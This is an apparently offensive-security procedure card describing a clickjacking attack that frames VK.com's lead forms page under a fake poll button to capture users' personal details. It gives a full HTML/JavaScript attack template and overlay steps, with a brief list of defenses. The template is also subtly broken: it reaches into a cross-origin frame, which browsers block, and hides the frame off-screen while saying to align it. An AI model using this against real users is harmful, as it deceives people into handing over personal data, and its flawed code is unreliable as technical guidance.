---
tags:
  - clickjacking
  - web
  - iframe
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:28:12.543Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: 81adbe5c-0cda-485f-b457-daae27acba5b
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Embed Page in Malicious Iframe

## Summary

This procedure sets up a malicious webpage that embeds the vulnerable VK.com /lead_forms_app.php in an iframe, overlaying a fake UI element like a button to disguise form submission and enable clickjacking.

## Description

Clickjacking relies on framing a legitimate page invisibly or with overlays to trick users into unintended actions. Here, the attacker hosts an external site (e.g., a fake poll) and positions the VK lead forms iframe such that a visible fake button aligns with the hidden submit button. When clicked, it submits the user's personal details. This requires hosting capabilities and CSS for precise positioning; the target must allow framing, as confirmed in prior recon.

## Requirements

1. Web hosting for the malicious site (e.g., local server or free host)
2. HTML/CSS knowledge for iframe and overlay setup
3. Verified vulnerable endpoint from reconnaissance

## Defense

Defensive measures and detection strategies:

- Enforce strict CSP frame-ancestors to block external iframes
- Add frame-busting JavaScript to detect and break out of unauthorized frames
- Scan for and block suspicious external referrals in server logs

## Objectives

1. Create a deceptive interface that hides the real form
2. Align fake interactions with legitimate form actions
3. Prepare for user luring and data capture

## Instructions

### Step 1: Create Malicious HTML Structure

**Context**: Build the base page with an embedded iframe for the VK form.

Use this HTML template:

```html
<!DOCTYPE html>
<html>
<head>
<title>Fake Poll</title>
<style>
  #frame { position: absolute; top: -1000px; left: -1000px; } /* Hide iframe */
  #fake-btn { position: relative; z-index: 10; } /* Overlay button */
</style>
</head>
<body>
  <h1>Confirm Your Poll Vote</h1>
  <button id="fake-btn" onclick="submitForm()">Vote Yes</button>
  <iframe id="frame" src="https://vk.com/lead_forms_app.php" width="800" height="600"></iframe>
  <script>
    function submitForm() {
      document.getElementById('frame').contentWindow.document.forms[0].submit();
    }
  </script>
</body>
</html>
```

Adjust CSS to align the fake button with the form's submit coordinates.

**Expected Output**: Page loads with hidden iframe; fake button visible.

### Step 2: Position Overlay Precisely

**Context**: Ensure clicks on the fake button trigger the iframe's form submission.

Inspect the iframe's form elements using browser dev tools and fine-tune positions so the button click simulates a click on the real submit button.

**Expected Output**: Clicking fake button submits the form in the iframe without user awareness.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[clickjacking]]
- [[web]]
- [[iframe]]
